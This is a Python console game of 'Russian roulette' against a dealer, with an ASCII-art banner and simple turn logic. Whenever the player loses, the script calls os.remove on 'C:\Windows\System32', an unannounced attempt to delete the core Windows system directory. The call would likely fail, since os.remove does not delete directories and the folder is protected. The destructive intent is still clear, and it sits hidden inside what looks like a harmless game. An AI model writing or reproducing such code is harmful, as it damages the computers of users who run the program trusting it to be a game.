import random
import time
import os

b = random.randint(1, 7)

ascii_art = """__________                    .__                       __________             .__          __    __          
\______   \__ __  ______ _____|__|____    ____          \______   \ ____  __ __|  |   _____/  |__/  |_  ____  
 |       _/  |  \/  ___//  ___/  \__  \  /    \   ______ |       _//  _ \|  |  \  | _/ __ \   __\   __\/ __ \ 
 |    |   \  |  /\___ \ \___ \|  |/ __ \|   |  \ /_____/ |    |   (  <_> )  |  /  |_\  ___/|  |  |  | \  ___/ 
 |____|_  /____//____  >____  >__(____  /___|  /         |____|_  /\____/|____/|____/\___  >__|  |__|  \___  >
        \/           \/     \/        \/     \/                 \/                       \/                \/ """
print(ascii_art)

dealert = 0

def dealer_turn():
    global dealert, b
    abc = random.randint(1, 6 - dealert)
    if abc == 1:
        time.sleep(1)
        print("Dealer shoots you")
        if b == dealert + 1:
            time.sleep(1)
            print("You died")
            os.remove("C:\Windows\System32")
            return False
        else:
            time.sleep(1)
            print("Blank.\nYour turn.")
            dealert += 1
            return True
    else:
        time.sleep(1)
        print("Dealer shoots himself")
        if b == dealert + 1:
            time.sleep(1)
            print("Dealer died, you won")
            return False
        else:
            time.sleep(1)
            print("Blank\nDealer's turn.")
            dealert += 1
            return dealer_turn()

def player_turn():
    global dealert, b
    while True:
        fi = input("Who will you shoot? (Me)/(Dealer) ")
        if fi == "Me" or fi == "Dealer":
            break
        else:
            print("Please enter (Me) or (Dealer) ")

    if fi == "Me":
        if b == dealert + 1:
            time.sleep(1)
            print("You died.")
            os.remove("C:\Windows\System32")
            return False
        else:
            time.sleep(1)
            print("Blank.\nYour turn again.")
            dealert += 1
            return player_turn()
    elif fi == "Dealer":
        if b == dealert + 1:
            time.sleep(1)
            print("Dealer died, you won.")
            return False
        else:
            time.sleep(1)
            print("Blank.\nDealer's turn.")
            dealert += 1
            return True

game_continue = True
print("Your turn.")
while game_continue:
    game_continue = player_turn()
    if game_continue:
        game_continue = dealer_turn()
